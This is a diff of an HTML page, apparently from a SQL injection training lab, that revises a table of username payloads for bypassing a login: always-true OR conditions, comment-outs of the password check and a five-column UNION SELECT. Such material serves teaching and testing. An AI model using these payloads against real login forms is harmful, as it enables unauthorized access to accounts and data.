@@ -74,12 +74,13 @@
                 <table class="table table-dark table-sm">
                     <thead><tr><th>#</th><th>Payload (Username)</th><th>Description</th></tr></thead>
                     <tbody>
-                    <tr><td>1</td><td><code>admin' OR '1'='1'--</code></td><td>Bypass auth with OR condition</td></tr>
-                    <tr><td>2</td><td><code>' OR '1'='1'--</code></td><td>Any username with always-true</td></tr>
-                    <tr><td>3</td><td><code>admin' UNION SELECT 1,2,3,4--</code></td><td>Union-based injection</td></tr>
-                    <tr><td>4</td><td><code>admin' AND '1'='1</code></td><td>True condition test</td></tr>
-                    <tr><td>5</td><td><code>' OR 1=1 LIMIT 1--</code></td><td>Limit results</td></tr>
-                    <tr><td>6</td><td><code>admin'--</code></td><td>Comment out password check</td></tr>
+                    <tr><td>1</td><td><code>admin' OR '1'='1'--</code></td><td>OR bypass - classic auth bypass</td></tr>
+                    <tr><td>2</td><td><code>' OR '1'='1'--</code></td><td>Empty username OR bypass</td></tr>
+                    <tr><td>3</td><td><code>admin'--</code></td><td>Comment out password check</td></tr>
+                    <tr><td>4</td><td><code>admin' AND '1'='1'--</code></td><td>AND true condition</td></tr>
+                    <tr><td>5</td><td><code>' OR 'x'='x'--</code></td><td>String OR bypass with comment</td></tr>
+                    <tr><td>6</td><td><code>1' OR 1=1 LIMIT 1--</code></td><td>LIMIT constraint bypass</td></tr>
+                    <tr><td>7</td><td><code>admin' UNION SELECT 1,'union','pass','union@union.com','2024-01-01'--</code></td><td>UNION SELECT injection (5 cols)</td></tr>
                     </tbody>
                 </table>
                 </div>
